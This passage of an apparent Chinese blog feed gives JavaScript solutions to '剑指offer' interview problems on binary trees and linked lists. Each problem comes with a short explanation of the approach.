class="keyword">right</span>==null&#125;</div><div class="line">  <span class="keyword">if</span>(<span class="keyword">right</span>==null)&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;</div><div class="line">  <span class="keyword">if</span>(<span class="keyword">left</span>.val!=<span class="keyword">right</span>.val)&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;</div><div class="line">  <span class="keyword">return</span> judge(<span class="keyword">left</span>.<span class="keyword">left</span>,<span class="keyword">right</span>.<span class="keyword">right</span>)&amp;&amp;judge(<span class="keyword">left</span>.<span class="keyword">right</span>,<span class="keyword">right</span>.<span class="keyword">left</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、首先根节点以及其左右子树，左子树的左子树和右子树的右子树相同<br>2、左子树的右子树和右子树的左子树相同即可，采用递归<br>3、非递归也可，采用栈或队列存取各级子树根节点</p><blockquote><p>五十九、按之字形顺序打印二叉树 p176</p></blockquote><p><strong>描述</strong>：请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Print</span><span class="params">(pRoot)</span></span>&#123;</div><div class="line">    <span class="keyword">var</span> lists=<span class="keyword">new</span> <span class="keyword">Array</span>();<span class="comment">//存放结果</span></div><div class="line">    <span class="keyword">if</span>(pRoot==<span class="keyword">null</span>)&#123;</div><div class="line">        <span class="keyword">return</span> lists;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> stack1=[];<span class="comment">//存放奇数行</span></div><div class="line">    <span class="keyword">var</span> stack2=[];<span class="comment">//存放偶数行</span></div><div class="line">    stack1.push(pRoot);</div><div class="line">    <span class="keyword">var</span> i=<span class="number">1</span>;<span class="comment">//层数</span></div><div class="line">    <span class="keyword">while</span>(stack1.length!=<span class="number">0</span> || stack2.length!=<span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">var</span> <span class="keyword">list</span>=<span class="keyword">new</span> <span class="keyword">Array</span>();</div><div class="line">        <span class="keyword">if</span>((i&amp;<span class="number">1</span>)==<span class="number">1</span>)&#123;<span class="comment">//当是奇数行的时候</span></div><div class="line">            <span class="keyword">while</span>(stack1.length!=<span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">var</span> temp=stack1[stack1.length<span class="number">-1</span>];<span class="comment">//用一数组记录下，一直是从后往前push的</span></div><div class="line">            <span class="keyword">list</span>.push(temp.val);</div><div class="line">            stack1.pop();</div><div class="line">            <span class="keyword">if</span>(temp.left!=<span class="keyword">null</span>)&#123;</div><div class="line">               <span class="comment">//把下一行（偶数行）的数保存在stack2中，因为是从右往左，所以在栈中先添加左子节点</span></div><div class="line">                stack2.push(temp.left);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(temp.right!=<span class="keyword">null</span>)&#123;</div><div class="line">                stack2.push(temp.right);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//当是偶数行的时候</span></div><div class="line">            <span class="keyword">while</span>(stack2.length!=<span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">var</span> temp=stack2[stack2.length<span class="number">-1</span>];</div><div class="line">                <span class="keyword">list</span>.push(temp.val);</div><div class="line">                stack2.pop();</div><div class="line">                <span class="comment">//因为奇数行是从左往右打印，所以在栈中先添加右子节点再添加左子节点</span></div><div class="line">                <span class="keyword">if</span>(temp.right!=<span class="keyword">null</span>)&#123;</div><div class="line">                    stack1.push(temp.right);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(temp.left!=<span class="keyword">null</span>)&#123;</div><div class="line">                    stack1.push(temp.left);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        i++;</div><div class="line">        lists.push(<span class="keyword">list</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> lists;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、<code>reverse()</code>效率太低了，会被鄙视；<br>2、可用做队列,实现树的层次遍历；<br>3、可双向遍历,奇数层时从前向后遍历，偶数层时从后向前遍历</p><blockquote><p>六十、把二叉树打印成多行 p174</p></blockquote><p><strong>描述</strong>：从上到下按层打印二叉树，同一层结点从左至右输出。每一层输出一行。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">function Print(pRoot)&#123;</div><div class="line">   var queue = [],</div><div class="line">       resultArr = [],</div><div class="line">       itemArr = []<span class="comment">;</span></div><div class="line"></div><div class="line">   if (pRoot == null) &#123;</div><div class="line">       return resultArr<span class="comment">;</span></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   queue.push(pRoot)<span class="comment">;</span></div><div class="line">   var nextLevelLen = <span class="number">0</span>,</div><div class="line">       <span class="keyword">waitPrint </span>= <span class="number">1</span><span class="comment">;</span></div><div class="line"></div><div class="line">   while (queue.length != <span class="number">0</span>) &#123;</div><div class="line">       var inode = queue[<span class="number">0</span>]<span class="comment">;</span></div><div class="line">       itemArr.push(inode.val)<span class="comment">;</span></div><div class="line"></div><div class="line">       if (inode.left != null) &#123;</div><div class="line">           queue.push(inode.left)<span class="comment">;</span></div><div class="line">           nextLevelLen ++<span class="comment">;</span></div><div class="line">       &#125;</div><div class="line">       if (inode.right != null) &#123;</div><div class="line">           queue.push(inode.right)<span class="comment">;</span></div><div class="line">           nextLevelLen ++<span class="comment">;</span></div><div class="line">       &#125;</div><div class="line"></div><div class="line">       queue.<span class="keyword">shift();</span></div><div class="line">       <span class="keyword">waitPrint </span>--<span class="comment">;</span></div><div class="line">       if (<span class="keyword">waitPrint </span>== <span class="number">0</span>) &#123;</div><div class="line">           resultArr.push(itemArr)<span class="comment">;</span></div><div class="line">           itemArr = []<span class="comment">;</span></div><div class="line">           <span class="keyword">waitPrint </span>= nextLevelLen<span class="comment">; // 下一行待打印的个数初始化为所有的结点个数</span></div><div class="line">           nextLevelLen = <span class="number">0</span><span class="comment">; // 重新统计在再一行应该有的结点个数</span></div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   return resultArr<span class="comment">;</span></div><div class="line"> &#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：???</p><blockquote><p>六十一、序列化二叉树 p194</p></blockquote><p><strong>描述</strong>：请实现两个函数，分别用来序列化和反序列化二叉树<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">x</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.val = x;</div><div class="line">  <span class="keyword">this</span>.left = <span class="literal">null</span>;</div><div class="line">  <span class="keyword">this</span>.right = <span class="literal">null</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> arr = [];</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Serialize</span>(<span class="params">pRoot</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(pRoot==<span class="literal">null</span>)&#123;</div><div class="line">        arr.push(<span class="string">'a'</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        arr.push(pRoot.val);</div><div class="line">        Serialize(pRoot.left);</div><div class="line">        Serialize(pRoot.right);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Deserialize</span>(<span class="params">s</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> node = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span>(arr.length&lt;<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> number = arr.shift();</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> number == <span class="string">'number'</span>)&#123;</div><div class="line">        node = <span class="keyword">new</span> TreeNode(number);</div><div class="line">        node.left = Deserialize(arr);</div><div class="line">        node.right = Deserialize(arr);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> node;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：???</p><blockquote><p>六十二、二叉搜索树的第k个结点  p269</p></blockquote><p><strong>描述</strong>：给定一棵二叉搜索树，请找出其中的第k小的结点。例如，（5，3，7，2，4，6，8）中，按结点数值大小顺序第三小结点的值为4。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">KthNode</span>(<span class="params">pRoot, k</span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span>(k&lt;=<span class="number">0</span>)&#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</div><div class="line">  <span class="keyword">var</span> count=<span class="number">0</span>; <span class="comment">//计数器</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Knodes</span>(<span class="params">pRoot, k</span>)</span>&#123;</div><div class="line">      <span class="keyword">if</span>(pRoot!==<span class="literal">null</span>)&#123;<span class="comment">//中序遍历寻找第k个</span></div><div class="line">        <span class="keyword">var</span> node = Knodes(pRoot.left, k);</div><div class="line">        <span class="keyword">if</span>(node!==<span class="literal">null</span>)&#123;<span class="keyword">return</span> node;&#125;</div><div class="line">        count++;</div><div class="line">        <span class="keyword">if</span>(count==k)&#123;<span class="keyword">return</span> pRoot;&#125;</div><div class="line"></div><div class="line">        node = Knodes(pRoot.right, k);</div><div class="line">        <span class="keyword">if</span>(node!==<span class="literal">null</span>)&#123;<span class="keyword">return</span> node;&#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> Knodes(pRoot,k);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：由于题目中的二叉树是给定的，所以本题考查的就是 中序遍历</p><blockquote><p>六十三、数据流中的中位数 p214</p></blockquote><p><strong>描述</strong>：如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。我们使用Insert()方法读取数据流，使用GetMedian()方法获取当前读取数据的中位数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> arr = [];</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Insert</span>(<span class="params">num</span>)</span>&#123;</div><div class="line">    arr.push(num);</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetMedian</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    arr.sort();</div><div class="line">    <span class="keyword">let</span> len = arr.length;</div><div class="line">    <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>(len/<span class="number">2</span>);</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</div><div class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">let</span> node1 = arr[mid];</div><div class="line">            <span class="keyword">let</span> node2 = arr[mid<span class="number">-1</span>];</div><div class="line">            <span class="keyword">return</span> (node1+node2)/<span class="number">2</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> arr[mid];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：考察最大堆和最小堆</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;四、 重建二叉树 p62&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;描述&lt;/strong&gt;：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;reConstructBinaryTree&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;pre, vin&lt;/span&gt;)&lt;/span&gt;&amp;#123; &lt;span class=&quot;comment&quot;&gt;//pre 是前序遍历，vin 是中序遍历&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// null 是真正的空，[] 里面还有东西&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; result =&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pre.length&amp;gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; root = pre[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// indexOf() 方法可返回某个指定的字符串值首次出现的位置。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 下面开始中序遍历&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 找到根节点的位置&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; vinRootIndex = vin.indexOf(root);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 根节点的左边是左子树&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; vinLeft = vin.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,vinRootIndex);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 右边就是右子树&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; vinRight = vin.slice(vinRootIndex+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,vin.length);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 下面开始前序遍历：&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// shift() 把数组的第一个元素从其中删除，并返回第一个元素的值&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 取走第一个数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      pre.shift();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 此时的第一个数是左子树的第一个数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; preLeft = pre.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,vinLeft.length);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; preRight = pre.slice(vinLeft.length,pre.length);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      result=&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;val&lt;/span&gt;:root,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;left&lt;/span&gt;:reConstructBinaryTree(preLeft,vinLeft),&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;right&lt;/span&gt;:reConstructBinaryTree(preRight,vinRight)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pre.length ===&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        result= &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;val&lt;/span&gt; :pre[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;left&lt;/span&gt;:&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;attr&quot;&gt;right&lt;/span&gt;:&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;：&lt;br&gt;1、函数里面的参数 &lt;code&gt;pre&lt;/code&gt; 是前序遍历，&lt;code&gt;vin&lt;/code&gt; 是中序遍历；&lt;br&gt;2、第一步我们进行的是中序遍历：&lt;br&gt;3、前序的第一个点就是根节点，用 &lt;code&gt;indexOf&lt;/code&gt; 找到根节点的位置；&lt;br&gt;4、中序遍历中，根节点前面就是左子树，根节点后面就是右子树&lt;br&gt;5、第二步我们开始前序遍历：&lt;br&gt;6、取出根节点！很重要&lt;br&gt;7、用中序遍历中左子树&lt;strong&gt;的长度&lt;/strong&gt;，可以知道前序遍历的左子树&lt;br&gt;8、同理可以得到前序遍历的右子树&lt;br&gt;9、第三步就是 &lt;strong&gt;递归&lt;/strong&gt;&lt;br&gt;10、你不是让我重构这个二叉树吗？OK，我的整体左子树也有小左子树和小右子树啊&lt;br&gt;11、这个时候，“根节点”变了，逻辑却没变，还是用开始的大函数。&lt;br&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="wangsiyuan233.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>剑指offer(1)--链表篇(JavaScript版)/共 题</title>
    <link href="wangsiyuan233.github.io/2018/10/05/76%E5%89%91%E6%8C%87-%E9%93%BE%E8%A1%A8%E7%AF%87/"/>
    <id>wangsiyuan233.github.io/2018/10/05/76剑指-链表篇/</id>
    <published>2018-10-05T10:59:16.000Z</published>
    <updated>2018-10-06T10:59:50.389Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>三、从尾到头打印链表 p58</p></blockquote><p><strong>描述</strong>：输入一个链表，按链表值从尾到头的顺序返回一个 <code>ArrayList</code>。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printListFromTailToHead</span>(<span class="params">head</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> p = head;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">while</span>(p)&#123;</div><div class="line">      <span class="comment">// unshift 需要添加到数组开头的元素。</span></div><div class="line">      <span class="comment">// val() 方法返回或设置被选元素的值。</span></div><div class="line">        result.unshift(p.val);</div><div class="line">        <span class="comment">// next() 获得匹配元素集合中每个元素紧邻的同胞元素</span></div><div class="line">        p = p.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：BUG题/<code>unshift()</code>在数组的头部添加任意个项并返回新数组的长度<br><a id="more"></a></p><blockquote><p>十四、链表中倒数第k个结点 p134</p></blockquote><p><strong>描述</strong>：输入一个链表，输出该链表中倒数第k个结点。本题从 1 开始计数，即链表的尾节点是倒数第 1 个节点。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindKthToTail</span>(<span class="params">head, k</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(head == <span class="literal">null</span> || k &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//表头为空指针 和 k为 0  都会原地爆炸</span></div><div class="line">    <span class="keyword">var</span> p1 = head;</div><div class="line">    <span class="keyword">var</span> p2 = head;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;<span class="comment">// 链表的节点数要大于 K 吧</span></div><div class="line">        <span class="keyword">if</span> (p1.next != <span class="literal">null</span>) &#123;</div><div class="line">            p1 = p1.next;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (p1.next != <span class="literal">null</span>)&#123;</div><div class="line">        p1 = p1.next;</div><div class="line">        p2 = p2.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、可以从定义看出，本题中的链表是单向链表，单向链表的节点只有从前往后的指针而没有从后往前的指针，所以不能从末尾开始扫描；<br>2、我们只需要遍历两次，第一次统计链表中节点的个数，第二次找到倒数K节点，这个时候面试官摁住了你的手，只允许你遍历一次；<br>3、于是我们就设计了两个指针，同时也要考虑到指针为空等情况</p><blockquote><p>十五、反转链表 p142</p></blockquote><p><strong>描述</strong>：输入一个链表，反转链表后，输出新链表的表头。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReverseList</span>(<span class="params">pHead</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (pHead == <span class="literal">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> p1 = pHead;<span class="comment">//旧表的表头</span></div><div class="line">    <span class="keyword">var</span> p2 = <span class="literal">null</span>;<span class="comment">//新表的表头就是旧表的表尾，现在为空</span></div><div class="line">        temp = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">while</span> (p1) &#123;</div><div class="line">      <span class="comment">// 链表的反转 和 左右子树的交换，都需要左右手</span></div><div class="line">        temp = p1.next;</div><div class="line">        p1.next = p2;</div><div class="line">        p2 = p1;</div><div class="line">        p1 = temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p2;</div><div 